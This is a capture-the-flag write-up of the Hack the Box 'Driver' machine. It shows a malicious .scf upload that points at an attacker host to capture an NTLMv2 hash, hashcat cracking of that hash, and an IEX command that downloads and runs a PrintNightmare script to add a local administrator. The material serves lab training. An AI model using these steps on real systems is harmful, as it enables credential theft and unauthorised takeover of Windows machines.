_Driver form Hack the Box_

Before I start with hacking I always edit the **/etc/hosts** file, mostly out of ease:
```
<TARGET-IP> driver.htb
```
Now lets start with an nmap scan to see what juicy ports are open. 

## NMAP 
```

_Nmap scanning for all TCP ports_

If we look at the **nmap** scan we see that we have a Windows server with a website on port 80, Microsoft Windows RPC on port 135 and 
an **SMB** port on 445.


Port 80 is always a good start to begin with, so let's browse to http://driver.htb.  
The site uses basic authetication and I was able to authenticate with the famous duo **admin:admin**.

_MFP Firmware Update Center_

First glance at the website shows us that this is printer management software that you can use to update the firmware.

![Desktop View](/assets/img/HTB/Driver/File_Upload.png){: width="1096" height="368" }
_File Upload_

I was able to upload my own files but none of my reverse shell attempts worked. Eventually
with some google searching I stumbled on the SMB-share file attack. You can find the article [here](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).

So lets try it out.

## SMB-share file attack 

As described in the article: let's open a text editor and create the following **.scf** file: 
```
[Shell]
Command=2
IconFile=\\<ATTACK-MACHINE-IP>\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
Before we upload the file make sure you have [**Responder**](https://www.kali.org/tools/responder/) listening.
```
sudo responder -wrf --lm -v -I tun0
```
Now let's upload the malicious **.scf** file we created. After the upload we will see
that **Responder** captured an **NTLM2** hash. If you are not sure with what hash you're dealing with
you can run tools like [**Hash-Identifier**](https://www.kali.org/tools/hash-identifier/)  or use the [**Hashcat-wiki**](https://hashcat.net/wiki/doku.php?id=example_hashes)
or let [**John the Ripper**](https://www.kali.org/tools/john/) make a guess for you.

```
[SMB] NTLMv2 Client   : 10.129.186.144
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:519b5e6d8014443e:84EECB86F592AD33C14BCFD75FADF8B0:010100000000000014418EE67DEBD701176F0EFA5976B78000000000020000000000000000000000

```
All you have to do now is crack the hash with your favourite tool, I used [**Hashcat**](https://www.kali.org/tools/hashcat/)
```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
**Hashcat** successfully cracked the hash and we now have the password: **liltony**
```
TONY::DRIVER:368ad063be1dd4f9:d2065c3cf444030f336f110dece37a04:01010000000000001fb200e77debd7014f2010d0d5eab9f300000000020000000000000000000000:liltony
```
Let's try to login with [**Evil-Winrm**](https://github.com/Hackplayers/evil-winrm):

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.129.186.144 -u 'tony' -p 'liltony'         

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
*Evil-WinRM* PS C:\Users\tony\Documents> 

```
Success! We've got the first user-flag:
```
*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
4633df9a68[....]

```

## Privileged Escalation
After some enumeration I found that the **spoolsv** service is
running which is the print spooler service.  

![Desktop View](/assets/img/HTB/Driver/spoolv.jpg){: width="647" height="487" }

This machine could be vulnerable for the **print nightmare** exploit if the Print Spooler service improperly performs privileged file operations.
If this is the case, the machine is vulnerable for remote code execution.

So let's exploit this bad boy.


## Print Nightmare 
Source: https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html


Start a webserver with the **CVE-2021-1675.ps1** script 
```
python3 -m http.server
```
On the target machine, run the following to get the **CVE-2021-1675.ps1** script.
```
IEX(New-Object Net.Webclient).downloadstring('http://<ATTACK-MACHINE-IP>:8000/CVE-2021-1675.ps1')
```
You can also upload the file via the upload function of **Evil-WinRM**. 

ANYHOW... now all we have to do is run the script on the target machine:
```
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser "Testy" -NewPassword "Test123"

[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user Testy as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll

```
This should add a new user as local administrator. 

Let's see if the **Testy** user is added 
and got the right privileges:
```
*Evil-WinRM* PS C:\Users\tony\Documents> net user Testy
User name                    Testy
Full Name                    Testy

```

Login with the new created account via **Evil-Winrm**
```

```

And we are there guys, get that beverage open and pop that bag of chips, you've earned it.

Hope you had just as much fun as I had, see you on the next hacking adventure.
